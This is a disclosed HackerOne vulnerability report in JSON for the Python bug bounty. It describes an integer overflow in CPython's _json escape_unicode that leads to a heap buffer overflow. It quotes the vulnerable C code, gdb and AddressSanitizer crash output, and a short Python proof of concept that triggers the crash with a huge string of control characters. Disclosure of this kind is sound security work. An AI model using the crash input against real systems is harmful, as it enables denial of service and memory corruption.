{"id":73260,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI2MA==","url":"https://hackerone.com/reports/73260","title":"Integer overflow in _json_encode_unicode leads to crash","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-06-27T00:00:00.000Z","submitted_at":"2015-06-27T00:00:00.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nilch","url":"/nilch","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27,"url":"https://hackerone.com/ibb-python","handle":"ibb-python","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Python (IBB)","twitter_handle":"","website":"http://www.python.org/news/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-06-27T00:00:00.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-06-27T00:00:00.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"http://bugs.python.org/issue24522\n\n```\n# static PyObject *\n# escape_unicode(PyObject *pystr)\n# {\n#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */\n#     Py_ssize_t i;\n#     Py_ssize_t input_chars;\n#     Py_ssize_t output_size;\n#     Py_ssize_t chars;\n#     PyObject *rval;\n#     void *input;\n#     int kind;\n#     Py_UCS4 maxchar;\n# \n#     if (PyUnicode_READY(pystr) == -1)\n#         return NULL;\n# \n#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);\n#     input_chars = PyUnicode_GET_LENGTH(pystr);\n#     input = PyUnicode_DATA(pystr);\n#     kind = PyUnicode_KIND(pystr);\n# \n#     /* Compute the output size */\n#     for (i = 0, output_size = 2; i \u003c input_chars; i++) {\n#         Py_UCS4 c = PyUnicode_READ(kind, input, i);\n#         switch (c) {\n#         case '\\\\': case '\"': case '\\b': case '\\f':\n#         case '\\n': case '\\r': case '\\t':\n#             output_size += 2;\n#             break;\n#         default:\n#             if (c \u003c= 0x1f)\n#                 output_size += 6;\n#             else\n#                 output_size++;\n#         }\n#     }\n#\n#     rval = PyUnicode_New(output_size, maxchar);\n#\n# 1.) if c is \u003c= 0x1f then output_size += 6. There are no overflow checks on this variable.\n# 2.) rval buffer is too small to hold results\n#\n# Crash:\n# ------\n#\n# Program received signal SIGSEGV, Segmentation fault.\n# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)\n#     at /home/pail/cpython/Modules/_json.c:306\n# 306                ENCODE_OUTPUT;\n#\n# OS info\n# --------\n#  %./python -V\n#  \u003e Python 3.6.0a0\n# % uname -a\n# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux\n#\n# ASAN Info (details in other file)\n# =================================================================\n# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac\n# WRITE of size 1 at 0xb5c00000 thread T0\n```\n\nimport json\n\nsp = \"\\x13\"*715827883 #((2**32)/6 + 1)\njson.dumps([sp], ensure_ascii=False)\n","vulnerability_information_html":"\u003cp\u003e\u003ca title=\"http://bugs.python.org/issue24522\" href=\"/redirect?url=http%3A%2F%2Fbugs.python.org%2Fissue24522\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://bugs.python.org/issue24522\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# static PyObject *\n# escape_unicode(PyObject *pystr)\n# {\n#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */\n#     Py_ssize_t i;\n#     Py_ssize_t input_chars;\n#     Py_ssize_t output_size;\n#     Py_ssize_t chars;\n#     PyObject *rval;\n#     void *input;\n#     int kind;\n#     Py_UCS4 maxchar;\n# \n#     if (PyUnicode_READY(pystr) == -1)\n#         return NULL;\n# \n#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);\n#     input_chars = PyUnicode_GET_LENGTH(pystr);\n#     input = PyUnicode_DATA(pystr);\n#     kind = PyUnicode_KIND(pystr);\n# \n#     /* Compute the output size */\n#     for (i = 0, output_size = 2; i \u0026lt; input_chars; i++) {\n#         Py_UCS4 c = PyUnicode_READ(kind, input, i);\n#         switch (c) {\n#         case \u0026#39;\\\\\u0026#39;: case \u0026#39;\u0026quot;\u0026#39;: case \u0026#39;\\b\u0026#39;: case \u0026#39;\\f\u0026#39;:\n#         case \u0026#39;\\n\u0026#39;: case \u0026#39;\\r\u0026#39;: case \u0026#39;\\t\u0026#39;:\n#             output_size += 2;\n#             break;\n#         default:\n#             if (c \u0026lt;= 0x1f)\n#                 output_size += 6;\n#             else\n#                 output_size++;\n#         }\n#     }\n#\n#     rval = PyUnicode_New(output_size, maxchar);\n#\n# 1.) if c is \u0026lt;= 0x1f then output_size += 6. There are no overflow checks on this variable.\n# 2.) rval buffer is too small to hold results\n#\n# Crash:\n# ------\n#\n# Program received signal SIGSEGV, Segmentation fault.\n# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)\n#     at /home/pail/cpython/Modules/_json.c:306\n# 306                ENCODE_OUTPUT;\n#\n# OS info\n# --------\n#  %./python -V\n#  \u0026gt; Python 3.6.0a0\n# % uname -a\n# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux\n#\n# ASAN Info (details in other file)\n# =================================================================\n# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac\n# WRITE of size 1 at 0xb5c00000 thread T0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eimport json\u003c/p\u003e\n\n\u003cp\u003esp = \u0026quot;\\x13\u0026quot;\u003cem\u003e715827883 #((2\u003c/em\u003e*32)/6 + 1)\u003cbr\u003e\njson.dumps([sp], ensure_ascii=False)\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":496273,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:46:48.589Z","updated_at":"2015-06-30T11:46:48.589Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-python","collaborator":{"username":"nilch","url":"/nilch"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1196235,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:46:48.589Z","updated_at":"2016-09-15T13:29:46.416Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"reporter":{"username":"nilch","url":"/nilch"},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}